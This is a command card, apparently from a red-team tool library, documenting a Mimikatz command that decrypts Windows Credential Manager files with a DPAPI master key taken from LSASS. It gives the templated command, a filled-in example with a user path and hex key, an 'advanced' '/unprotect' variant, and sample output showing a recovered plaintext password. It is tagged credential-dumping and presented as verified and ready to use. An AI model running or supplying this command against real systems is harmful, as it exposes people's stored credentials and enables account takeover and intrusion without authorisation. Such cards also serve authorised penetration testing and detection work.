---
id: 3fa32fbf-33e3-4aa0-b81a-642b05392e69
name: mimikatz-dpapi-cred-decrypt-with-masterkey
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::cred
  /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE
  /masterkey:$_MASTER_KEY" exit
output: null
created_at: '2023-04-06T03:56:27.473645+00:00'
updated_at: '2023-04-10T20:37:18.798330+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - decryption
verified: true
validated: true
---

# mimikatz-dpapi-cred-decrypt-with-masterkey

## Command

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE /masterkey:$_MASTER_KEY" exit
```

## Description

Decrypts a Credential Manager file using the provided DPAPI master key with Mimikatz, revealing plaintext credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Target username | Yes |
| $_CREDENTIAL_FILE | GUID of credential file | Yes |
| $_MASTER_KEY | Hex DPAPI master key from LSASS | Yes |
| /in | Input file path | Built-in |
| /masterkey | Decryption key | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\john.doe\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b" exit
```

### Advanced Usage

```cmd
mimikatz.exe "dpapi::cred /in:"C:\path\file" /masterkey:$_MASTER_KEY /unprotect" exit
```

## Expected Output

```
*** Cred info ***
  Type  : GENERIC
  Name  : Legacy_Generic
  Data  : 
    username : targetuser
    password : P@ssw0rd123!
```

## Related

- [[procedures/Credential-Theft-with-Mimikatz-and-DPAPI]]
- [[tools/Mimikatz]]
